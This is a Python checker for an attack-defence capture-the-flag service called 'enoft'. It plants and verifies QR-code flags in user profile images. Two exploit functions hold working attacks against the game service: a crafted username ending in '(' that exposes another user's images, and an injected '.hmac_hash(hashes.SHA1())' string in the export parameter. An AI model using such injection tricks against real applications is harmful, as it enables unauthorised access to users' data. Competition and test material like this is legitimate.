from logging import LoggerAdapter
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    OfflineException,
    InternalErrorException
)
from typing import Optional
from utils import InteractionManager, generate_random_string
from bs4 import BeautifulSoup
import qr_codes
from httpx import AsyncClient

SERVICE_PORT = 8008
checker = Enochecker("enoft", 8008)
def app(): return checker.app


CORE_ONLY = False


@checker.putflag(0)
async def putflag_email(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
) -> None:
    logger.info(f"Putting flag 0 {client.base_url}")
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    m = InteractionManager(db, logger, client)
    await m.register(vendor_lock=True)
    await m.upload_image(qrCode)
    await m.logout()
    data = await m.dump_info()
    logger.info(f"Put flag 0 {client.base_url}")
    return data["email"]


@checker.getflag(0)
async def getflag_email(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
) -> None:
    logger.info(f"Getting flag 0 {client.base_url}")
    m = InteractionManager(db, logger, client)
    await m.load_db()
    await m.login()
    imgs = await m.download_profile_images_from_self()
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    if task.flag not in imgs:
        logger.error(
            f"Flag not found in images {task.flag} {imgs} {client.base_url}")
        raise MumbleException("Flag not found in profile")
    await m.logout()
    logger.info(f"Got flag 0 {client.base_url}")


@checker.exploit(0)
async def exploit_email(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info
    name = email + "("
    m = InteractionManager(None, logger, client, name)
    await m.register()
    imgs = await m.download_profile_images_from_email(email)
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    imgs = [img for img in imgs if img]
    if not imgs:
        raise MumbleException("No images found")
    await m.logout()
    logger.info(f"Exploited {task.attack_info} ")
    return imgs[0]


@checker.putflag(1)
async def putflag_export(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
) -> None:
    logger.info(f"Putting flag 1 {client.base_url}")
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    m = InteractionManager(db, logger, client)
    await m.register(low_quality=True)
    await m.upload_image(qrCode)
    await m.logout()
    data = await m.dump_info()
    logger.info(f"Put flag 1 {client.base_url}")
    return data["email"]


@checker.getflag(1)
async def getflag_export(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
) -> None:
    logger.info(f"Getting flag 1 {client.base_url}")
    m = InteractionManager(db, logger, client)
    await m.load_db()
    await m.login()
    imgs = await m.get_profile_image_urls(m.email)
    img_url = imgs[0]
    img = await m.export_image_url(img_url)
    flag = qr_codes.read_qr_code(img)
    assert_equals(task.flag, flag, "Export failed")
    await m.logout()
    logger.info(f"Got flag 1 {client.base_url}")


@checker.exploit(1)
async def exploit_export(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info

    m = InteractionManager(None, logger, client)
    await m.register()
    urls = await m.get_profile_image_urls(email)
    img_url = urls[0]
    img = await m.export_image_url(img_url, ".hmac_hash(hashes.SHA1())")
    flag = qr_codes.read_qr_code(img)
    logger.info(f"Decoded image: {flag}")
    return flag


@checker.putnoise(0)
async def putnoise_0(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
):
    if CORE_ONLY:
        return
    logger.info(f"Putting noise 0 {client.base_url}")
    random_string = generate_random_string(20)
    try:
        await db.set("random_string", random_string)
    except:
        raise InternalErrorException("Error saving data")
    qrCode = qr_codes.create_qr_code(random_string)
    m = InteractionManager(db, logger, client)
    await m.register(vendor_lock=True)
    await m.upload_image(qrCode)
    await m.logout()
    data = await m.dump_info()
    logger.info(f"Put noise 0 {client.base_url}")
    return data["email"]


@checker.getnoise(0)
async def getnoise_0(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
):
    if CORE_ONLY:
        return
    logger.info(f"Getting noise 0 {task.address}")
    try:
        noise = await db.get("random_string")
    except:
        raise MumbleException("No noise saved in db")
    m = InteractionManager(db, logger, client)
    await m.load_db()
    await m.login()
    imgs = await m.download_profile_images_from_self()
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    assert_in(noise, imgs, "Noise not found in images")
    await m.logout()
    logger.info(f"Got noise 0 {task.address}")


@checker.putnoise(1)
async def putnoise_1(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
):
    if CORE_ONLY:
        return
    logger.info(f"Putting noise 1 {client.base_url}")
    random_string = generate_random_string(25)
    try:
        await db.set("random_string", random_string)
    except:
        raise InternalErrorException("Error saving data")
    qrCode = qr_codes.create_qr_code(random_string)
    m = InteractionManager(db, logger, client)
    await m.register(low_quality=True)
    await m.upload_image(qrCode)
    await m.logout()
    data = await m.dump_info()
    logger.info(f"Put noise 1 {client.base_url}")
    return data["email"]


@checker.getnoise(1)
async def getnoise_1(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
    client: AsyncClient
):
    if CORE_ONLY:
        return
    logger.info(f"Getting noise 1 {task.address}")
    try:
        noise = await db.get("random_string")
    except:
        raise MumbleException("No noise saved in db")
    m = InteractionManager(db, logger, client)
    await m.load_db()
    await m.login()
    imgs = await m.get_profile_image_urls(m.email)
    img_url = imgs[0]
    img = await m.export_image_url(img_url)
    flag = qr_codes.read_qr_code(img)
    assert_equals(noise, flag, "Noise not found in image")
    await m.logout()
    logger.info(f"Got noise 1 {task.address}")


@checker.havoc(0)
async def havoc_0(
    task: HavocCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient
):
    if CORE_ONLY:
        return
    logger.info(f"Havoc 0 {task.address}")
    m = InteractionManager(None, logger, client)
    await m.register()
    main = await m.get_home_page()
    soup = BeautifulSoup(main, "html.parser")
    imgs = soup.find_all("img")
    imgs = [img["src"] for img in imgs]
    if not imgs:
        raise MumbleException("Homepage broken")
    if "/static/logo.png" not in imgs:
        raise MumbleException("Homepage broken")
    await m.logout()


if __name__ == "__main__":
    checker.run()
